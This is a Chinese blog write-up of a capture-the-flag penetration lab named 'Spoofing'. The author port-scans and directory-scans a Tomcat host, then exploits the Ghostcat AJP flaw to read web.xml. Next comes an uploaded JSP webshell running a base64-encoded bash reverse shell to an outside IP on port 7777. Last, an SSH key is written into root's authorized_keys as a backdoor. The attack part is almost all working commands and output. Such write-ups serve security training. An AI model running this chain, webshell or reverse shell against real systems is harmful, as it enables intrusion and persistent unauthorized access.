<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Spoofing, q1n9&#39;s blog">
    <meta name="description" content="39.99.132.128
Spoofingflag01â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢/tools/tools/fscan_all_version]
â””â”€$ ./fscan -h 39.99.132.128            ">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Spoofing | q1n9&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">q1n9&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>é¦–é¡µ</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>æ ‡ç­¾</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>åˆ†ç±»</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>å½’æ¡£</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>å…³äº</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>ç•™è¨€æ¿</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>å‹æƒ…é“¾æ¥</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="æœç´¢" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="æ·±è‰²/æµ…è‰²æ¨¡å¼" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">q1n9&#39;s blog</div>
        <div class="logo-desc">
            
            welcome to my blog
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			é¦–é¡µ
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			æ ‡ç­¾
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			åˆ†ç±»
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			å½’æ¡£
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			å…³äº
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			ç•™è¨€æ¿
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			å‹æƒ…é“¾æ¥
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Spoofing</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
                                <span class="chip bg-color">æ˜¥ç§‹äº‘é•œ</span>
                            </a>
                        
                            <a href="/tags/%E6%B8%97%E9%80%8F/">
                                <span class="chip bg-color">æ¸—é€</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>å‘å¸ƒæ—¥æœŸ:&nbsp;&nbsp;
                    2025-09-28
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>æ›´æ–°æ—¥æœŸ:&nbsp;&nbsp;
                    2025-09-28
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>æ–‡ç« å­—æ•°:&nbsp;&nbsp;
                    6.9k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>é˜…è¯»æ—¶é•¿:&nbsp;&nbsp;
                    35 åˆ†
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>é˜…è¯»æ¬¡æ•°:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- æ˜¯å¦åŠ è½½ä½¿ç”¨è‡ªå¸¦çš„ prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>39.99.132.128</p>
<h1 id="Spoofing"><a href="#Spoofing" class="headerlink" title="Spoofing"></a>Spoofing</h1><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢/tools/tools/fscan_all_version]
â””â”€$ ./fscan -h 39.99.132.128                

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
39.99.132.128:8080 open
Open result.txt error, open result.txt: permission denied
39.99.132.128:22 open
Open result.txt error, open result.txt: permission denied
39.99.132.128:8009 open
Open result.txt error, open result.txt: permission denied
[*] alive ports len is: 3
start vulscan
[*] WebTitle http://39.99.132.128:8080 code:200 len:7091   title:åå°ç®¡ç†
Open result.txt error, open result.txt: permission denied
å·²å®Œæˆ 2/3 [-] ssh 39.99.132.128:22 admin 000000 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none], no supported methods remain 
å·²å®Œæˆ 3/3
[*] æ‰«æç»“æŸ,è€—æ—¶: 1m16.471599593s
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”¨<code>dirsearch</code>æ‰«ä¸€ä¸‹åå°</p>
<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(rootã‰¿kali)-[~/dirsearch]
â””â”€# python3 dirsearch.py -u http://39.99.132.128:8080/ --max-rate=10

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                     
 (_||| _) (/_(_|| (_| )                                                                                                              
                                                                                                                                     
Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12293

Target: http://39.99.132.128:8080/

[03:45:52] Scanning:                                                                                                                 
[03:48:56] 200 -   114B - /404.html                                         
[03:49:03] 200 -    7KB - /;json/                                           
[03:49:03] 400 -   795B - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[03:49:05] 200 -    7KB - /;admin/                                          
[03:49:05] 200 -    7KB - /;login/
[03:49:23] 400 -   795B - /a%5c.aspx                                        
[03:55:18] 200 -    7KB - /console.html                                     
[03:55:36] 302 -     0B - /css  -&gt;  /css/                                   
[03:55:42] 302 -     0B - /data  -&gt;  /data/                                 
[03:56:09] 302 -     0B - /docs  -&gt;  /docs/                                 
[03:56:09] 200 -   17KB - /docs/                                            
[03:56:10] 404 -   732B - /docs/CHANGELOG.html                              
[03:56:10] 404 -   729B - /docs/_build/                                     
[03:56:11] 404 -   749B - /docs/html/admin/ch03s07.html                     
[03:56:11] 404 -   733B - /docs/export-demo.xml                             
[03:56:11] 404 -   747B - /docs/html/admin/index.html                       
[03:56:12] 404 -   731B - /docs/changelog.txt                               
[03:56:12] 404 -   749B - /docs/html/admin/ch01s04.html
[03:56:12] 404 -   746B - /docs/html/admin/ch01.html
[03:56:13] 404 -   750B - /docs/html/developer/ch02.html                    
[03:56:13] 404 -   753B - /docs/html/developer/ch03s15.html                 
[03:56:13] 404 -   733B - /docs/maintenance.txt
[03:56:13] 404 -   737B - /docs/html/index.html                             
[03:56:13] 404 -   730B - /docs/updating.txt
[03:56:13] 404 -   730B - /docs/swagger.json
[03:56:14] 200 -   132B - /download/                                        
[03:56:15] 302 -     0B - /download  -&gt;  /download/                         
[03:56:44] 302 -     0B - /examples  -&gt;  /examples/                         
[03:56:44] 200 -    1KB - /examples/websocket/index.xhtml                   
[03:56:44] 404 -   746B - /examples/servlet/SnoopServlet
[03:56:46] 200 -   14KB - /examples/jsp/index.html                          
[03:56:46] 200 -   658B - /examples/servlets/servlet/CookieExample
[03:56:46] 404 -   781B - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[03:56:46] 200 -    1KB - /examples/
[03:56:46] 200 -  1010B - /examples/servlets/servlet/RequestHeaderExample
[03:56:47] 200 -   685B - /examples/jsp/snp/snoop.jsp                       
[03:56:47] 200 -    6KB - /examples/servlets/index.html                     
[03:57:49] 403 -    3KB - /host-manager/                                    
[03:57:50] 403 -    3KB - /host-manager/html                                
[03:58:05] 302 -     0B - /images  -&gt;  /images/                             
[03:58:14] 200 -    7KB - /index.html                                       
[03:58:41] 302 -     0B - /js  -&gt;  /js/                                     
[03:58:57] 302 -     0B - /lib  -&gt;  /lib/                                   
[03:59:35] 403 -    3KB - /manager/html/                                    
[03:59:35] 403 -    3KB - /manager/                                         
[03:59:35] 403 -    3KB - /manager/html                                     
[03:59:35] 403 -    3KB - /manager/jmxproxy/?get=java.lang:type=Memory&amp;att=HeapMemoryUsage
[03:59:36] 403 -    3KB - /manager/login.asp                                
[03:59:36] 403 -    3KB - /manager/jmxproxy/?set=BEANNAME&amp;att=MYATTRIBUTE&amp;val=NEWVALUE
[03:59:36] 403 -    3KB - /manager/login                                    
[03:59:36] 403 -    3KB - /manager/jmxproxy                                 
[03:59:36] 403 -    3KB - /manager/VERSION
[03:59:36] 403 -    3KB - /manager/status/all
[03:59:37] 403 -    3KB - /manager/jmxproxy/?invoke=BEANNAME&amp;op=METHODNAME&amp;ps=COMMASEPARATEDPARAMETERS
[03:59:38] 403 -    3KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&amp;op=findConnectors&amp;ps=
[03:59:38] 403 -    3KB - /manager/admin.asp                                
[03:59:39] 403 -    3KB - /manager/jmxproxy/?qry=STUFF                      
[03:59:39] 302 -     0B - /manager  -&gt;  /manager/                           
[03:59:40] 403 -    3KB - /manager/jmxproxy/?get=BEANNAME&amp;att=MYATTRIBUTE&amp;key=MYKEY
[04:05:18] 403 -     0B - /upload                                           
[04:05:19] 403 -     0B - /upload/                                          
[04:05:19] 403 -     0B - /upload/1.php                                     
[04:05:19] 403 -     0B - /upload/loginIxje.php
[04:05:20] 403 -     0B - /upload/test.php
[04:05:20] 403 -     0B - /upload/upload.php
[04:05:20] 403 -     0B - /upload/test.txt
[04:05:22] 403 -     0B - /upload/b_user.xls                                
[04:05:22] 403 -     0B - /upload/b_user.csv                                
[04:05:22] 403 -     0B - /upload/2.php                                     
[04:05:26] 200 -    9KB - /user.html                                        
                                                                             
Task Completed <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/YhMjQx/article/details/146321509">CVEé‡è¦æ¼æ´å¤ç°ä¹‹Tomcat-CVE-2020-1983æ¼æ´_tomcatæ¼æ´å¤ç°-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">Ghostcat-CNVD-2020-10487</a></p>
<pre class="line-numbers language-none"><code class="language-none">cd /usr/share/doc/python3-impacket/examples/
python3 ajpShooter.py http://39.99.132.128:8080 8009  /WEB-INF/web.xml read


â”Œâ”€â”€(rootã‰¿kali)-[/usr/share/doc/python3-impacket/examples]
â””â”€# python3 ajpShooter.py http://39.99.132.128:8080 8009  /WEB-INF/web.xml read
/usr/share/doc/python3-impacket/examples/ajpShooter.py:363: SyntaxWarning: invalid escape sequence '\ '
  /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[&lt;] 200 200
[&lt;] Accept-Ranges: bytes
[&lt;] ETag: W/"2489-1670857638305"
[&lt;] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT
[&lt;] Content-Type: application/xml
[&lt;] Content-Length: 2489

&lt;!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" &gt;

&lt;web-app&gt;
  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;

  &lt;security-constraint&gt;
    &lt;display-name&gt;Tomcat Server Configuration Security Constraint&lt;/display-name&gt;
    &lt;web-resource-collection&gt;
      &lt;web-resource-name&gt;Protected Area&lt;/web-resource-name&gt;
      &lt;url-pattern&gt;/upload/*&lt;/url-pattern&gt;
    &lt;/web-resource-collection&gt;
    &lt;auth-constraint&gt;
      &lt;role-name&gt;admin&lt;/role-name&gt;
    &lt;/auth-constraint&gt;
  &lt;/security-constraint&gt;

  &lt;error-page&gt;
    &lt;error-code&gt;404&lt;/error-code&gt;
    &lt;location&gt;/404.html&lt;/location&gt;
  &lt;/error-page&gt;

  &lt;error-page&gt;
    &lt;error-code&gt;403&lt;/error-code&gt;
    &lt;location&gt;/error.html&lt;/location&gt;
  &lt;/error-page&gt;

  &lt;error-page&gt;
    &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;
    &lt;location&gt;/error.html&lt;/location&gt;
  &lt;/error-page&gt;

  &lt;servlet&gt;
    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/HelloServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;

  &lt;servlet&gt;
    &lt;display-name&gt;LoginServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.example.LoginServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/LoginServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;

  &lt;servlet&gt;
    &lt;display-name&gt;RegisterServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.example.RegisterServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/RegisterServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;

  &lt;servlet&gt;
    &lt;display-name&gt;UploadTestServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.example.UploadTestServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;                               //here
  &lt;/servlet-mapping&gt;

  &lt;servlet&gt;
    &lt;display-name&gt;DownloadFileServlet&lt;/display-name&gt;
    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.example.DownloadFileServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
&lt;/web-app&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çœ‹åˆ°ä¸€ä¸ª</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;servlet-mapping&gt;
  &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;
  &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;                               //here
&lt;/servlet-mapping&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>äºæ˜¯æ‰“ç®—ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬ç„¶åæ‰§è¡Œ</p>
<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/47.104.168.57/7777 0&gt;&amp;1
YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDQuMTY4LjU3Lzc3NzcgMD4mMQ==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬shell</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;%
    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDQuMTY4LjU3Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}").getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("&lt;pre&gt;");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("&lt;/pre&gt;");
%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/861bc769055cf19feb8f631b2dd3fc8c.png"></p>
<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(rootã‰¿kali)-[/usr/share/doc/python3-impacket/examples]
â””â”€# python3 ajpShooter.py http://39.99.132.128:8080 8009 /upload/4402ca1950948073bfb147acf9c4fa9a/20250925042103715.txt eval
/usr/share/doc/python3-impacket/examples/ajpShooter.py:363: SyntaxWarning: invalid escape sequence '\ '
  /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[&lt;] 200 200
[&lt;] Set-Cookie: JSESSIONID=CCE5B6442EC8D4FCBB8D87B4A5745F33; Path=/; HttpOnly
[&lt;] Content-Type: text/html;charset=ISO-8859-1
[&lt;] Content-Length: 11

&lt;pre&gt;&lt;/pre&gt;    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆåŠŸåå¼¹</p>
<h5 id="å†™å…¬é’¥ç•™åé—¨äº†"><a href="#å†™å…¬é’¥ç•™åé—¨äº†" class="headerlink" title="å†™å…¬é’¥ç•™åé—¨äº†"></a>å†™å…¬é’¥ç•™åé—¨äº†</h5><pre class="line-numbers language-none"><code class="language-none">#è‡ªå·±çš„æœºå™¨ä¸Š
ssh-keygen -t rsa -b 4096
cat ~/.ssh/id_rsa.pub
#å¼¹çš„shell
echo "~/.ssh/id_rsa.pubçš„å†…å®¹" &gt; /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

ssh -i ~/.ssh/id_rsa root@39.99.132.128<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxwyv90Cq7+ER5/yxcFtL+0BgZRyve9+4hxTLARZmPqL3OTA+bVRfqeQSgisRIyOVUclsMFE2ItHE1fiNU7bhJ/BoHECDs4alVIkp/iiYNxRgs+1tHzOSRmp3DeYCdXV5nZ8g/8wKzAQY7wCA5aS3OY2Q6ImHlSXBHT2sThaqaO91/XculzHlHYD/0si5KS2wutx3AGOo9/gbSlLyOnHzTkyhNe3PYNyui4qBMs1UnK1+EqV99hHyiXrA0gIrrnTJuOiLHgjfteb1TS5wegZIre9597xuEy/G7GzJIc2bilvcDuERTpdFCoH40bMRoNP7ARsucwXq1kgPp2teoLF/o9B6HcbUXz1aFKzcw8jdgPTKllDux/2GuHxpnHqkvltB7s3dhnEOffe7DoAOGkZymfHiIq7FQ1f6CcKj3SLSuY45s8vaahmPl1HgzPU68LGyMCdHZuFmrUhKhw0Ar8SAK1gLwOXj1xOgy+/ro0SGpoZJOyIJX/LtJxURp70b0+Bya7RZ9ZjDeVao3hvlePx8tipWoep/KdhX8yR9d3JDApCekD6joi8gW6AOLL47KY7TAGJt9m/09xOGCKTf1ApETgh6ooOiW2Lea0yWPdbRG1ekn14yVyPc1e5dPMx6XeHR9xq87cNxQ5dil/jerUeoiFjKaP9KkXoOAXpttj2+Bxw== root@kali" &gt; /root/.ssh/authorized_keys



